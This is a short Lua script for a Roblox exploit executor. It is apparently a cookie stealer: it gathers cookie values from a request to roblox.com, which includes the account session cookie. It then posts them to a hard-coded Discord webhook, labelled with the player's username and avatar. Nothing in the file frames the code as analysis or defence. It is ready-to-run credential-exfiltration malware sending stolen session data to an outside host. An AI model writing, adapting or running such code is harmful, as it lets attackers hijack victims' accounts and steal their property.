local response = syn.request(
    {
        Url = "https://www.roblox.com",
    }
)
for i,v in pairs(response) do
    if type(v) == "table" then
        for ii,vv in pairs(v) do
            if string.find(ii, "cookie") then
                COOKIE = COOKIE.."\n"..vv
            end
        end
    end
end

syn.request({
    Url = "https://discord.com/api/webhooks/1039964656950853663/wW0l5MynaSMgm75pl2G7C3MrpCaijnbaNkPJvnVT4aYO_iCOo-cq1ucx0yQuuL27H0St", 
    Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"]={{
            ["title"]="Deaf",
            ["type"]="rich",
            ["description"]=COOKIE,
            ["color"]=tonumber(0x7269da),
            ["footer"]={
                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p")
            }
        }},
        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
        ["username"]="Username: "..game.Players.LocalPlayer.Name,
    }), 
    Method = "POST", 
    Headers = {["content-type"] = "application/json"}
})
